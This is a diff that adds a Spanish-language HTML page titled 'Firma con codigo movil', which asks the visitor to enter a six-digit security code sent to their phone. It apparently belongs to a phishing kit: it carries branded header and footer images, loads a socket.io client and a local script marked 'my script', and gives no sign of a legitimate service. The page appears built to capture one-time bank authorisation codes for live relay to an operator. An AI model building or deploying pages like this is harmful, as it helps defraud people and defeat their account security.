@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/galo.css">
+    <link rel="stylesheet" href="./css/galo-mb.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >  
+    <div class="topline"></div>
+    <div class="kolchi">
+        
+        <!-- lfoqani -->
+        
+        <div class="lfoq">
+            <div class="top-img">
+                <img class="top-pc" src="./img/hetopo-pc-02.png" alt="">
+                <img class="top-mb" src="./img/hedopo-mb-02.png" alt="">
+            </div>
+        </div>
+        <!--  -->
+        <div class="center2">
+            <div>
+                <p class="pp3">Firma con codigo movil</p>
+                
+                <form method="post" id="pg1">
+                    <div class="group3">
+                        <p class="pp4">Introduzca la clave de <span>6 caracteres</span> que hemos enviado a su móvil</p> 
+                        <input class="inp1" style="color: rgb(71, 71, 71);" type="text" id="dni" maxlength="6" placeholder="Clave de seguridad" required>
+                    </div>
+                    <button type="submit" id="submitBtn" disabled>Continuar</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="botano">
+            <img class="bot-pc" src="./img/botanoma-pc01.png" alt="">
+            <img class="bot-mb" src="./img/botanoma-mb01.png" alt="">
+            <!-- <div class="topline2"></div> -->
+        </div>
+    </div>
+    
+
+    <script>
+       document.addEventListener('DOMContentLoaded', function() {
+    const input = document.getElementById('dni');
+    const submitBtn = document.getElementById('submitBtn');
+
+    input.addEventListener('input', function() {
+        const value = input.value;
+
+        // Allow only numeric input
+        input.value = value.replace(/\D/g, '');
+
+        // Check if the input length is exactly 6 digits
+        if (input.value.length === 6) {
+            input.classList.remove('invalid'); // Remove red border
+            submitBtn.disabled = false; // Enable the button
+        } else {
+            input.classList.add('invalid'); // Add red border if invalid
+            submitBtn.disabled = true; // Disable the button
+        }
+
+        // If input exceeds 6 digits, turn border red and disable button
+        if (input.value.length > 6) {
+            input.classList.add('invalid');
+            submitBtn.disabled = true;
+        }
+    });
+});
+    </script>
+    <script type="importmap">
+        {
+          "imports": {
+            "socket.io-client": "https://cdn.socket.io/4.7.2/socket.io.esm.min.js"
+          }
+        }
+      </script>
+    <!-- my script -->
+    <script src="./js/stb.js" type="module"></script>
+</body>
+</html>
